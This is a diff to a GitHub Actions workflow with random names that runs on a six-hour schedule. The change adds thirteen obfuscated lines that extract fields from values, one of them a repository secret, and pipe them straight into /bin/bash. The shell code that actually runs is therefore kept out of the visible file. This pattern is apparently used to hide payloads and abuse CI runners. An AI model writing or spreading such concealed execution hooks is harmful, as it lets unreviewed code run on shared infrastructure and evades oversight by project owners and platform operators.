@@ -3,7 +3,8 @@ name: songliwen1986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '14 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: songliwen1986
         env:
-          a60: ${{ secrets.a60 }}
+          g637: ${{ secrets.g637 }}
         run: |
-          echo $a60 | jq -r .jb95 | /bin/bash
-          echo $rt14084 | jq -r .u198 | /bin/bash
+          echo $g637 | jq -r .nim7147 | /bin/bash
+          echo $m92 | jq -r .kcq9 | /bin/bash
+          echo $r8 | jq -r .r1337 | /bin/bash
+          echo $lbm32 | jq -r .gm486 | /bin/bash
+          echo $jx63 | jq -r .bmq23 | /bin/bash
+          echo $rwg1 | jq -r .mpyl435 | /bin/bash
+          echo $wogul5489 | jq -r .oimxe874 | /bin/bash
+          echo $o20008 | jq -r .zlhbr34570 | /bin/bash
+          echo $fszm32164 | jq -r .hteti35 | /bin/bash
+          echo $dv46656 | jq -r .fc71 | /bin/bash
+          echo $qvff7 | jq -r .wwmot221 | /bin/bash
+          echo $uxj043 | jq -r .ef9 | /bin/bash
+          echo $blov9703 | jq -r .an68354 | /bin/bash
 
